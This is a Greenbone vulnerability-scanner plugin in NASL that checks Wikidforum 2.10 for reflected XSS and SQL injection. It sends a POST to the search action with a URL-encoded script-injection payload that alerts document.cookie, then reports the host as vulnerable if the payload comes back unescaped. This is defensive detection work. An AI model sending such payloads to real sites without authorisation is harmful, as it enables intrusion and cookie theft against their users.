# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802710");
  script_version("2024-06-27T05:05:29+0000");
  script_cve_id("CVE-2012-6520", "CVE-2012-2099");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-03-16 13:30:44 +0530 (Fri, 16 Mar 2012)");
  script_name("Wikidforum Multiple XSS and SQLi Vulnerabilities");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2012/q2/75");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52425");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73985");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73980");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521934");
  script_xref(name:"URL", value:"http://www.darksecurity.de/advisories/2012/SSCHADV2012-005.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110697/SSCHADV2012-005.txt");
  script_xref(name:"URL", value:"http://sec.jetlib.com/Bugtraq/2012/03/12/Wikidforum_2.10_Multiple_security_vulnerabilities");
  script_xref(name:"URL", value:"http://www.wikidforum.com/forum/forum-software_29/wikidforum-support_31/sschadv2012-005-unfixed-xss-and-sql-injection-security-vulnerabilities_188.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Wikidforum version 2.10");

  script_tag(name:"insight", value:"The flaws are due to input validation errors in the 'search'
  field and 'Author', 'select_sort' and 'opt_search_select' parameters in
  'Advanced Search' field when processing user-supplied data.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Wikidforum is prone to multiple cross-site scripting and SQL injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/wiki", "/wikidforum", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/admin/login.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if(rcvRes && ('"Wikid Forum' >< rcvRes || (">Wiki - Admin<" >< rcvRes &&
          "loginboxmain" >< rcvRes && "loginimgmain" >< rcvRes)))
  {
    postdata = "txtsearch=%27%22%3C%2Fscript%3E%3Cscript%3Ealert%28" +
                "document.cookie%29%3C%2Fscript%3E";
    req = string("POST ", dir, "/index.php?action=search&mode=search HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie)</script>" >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
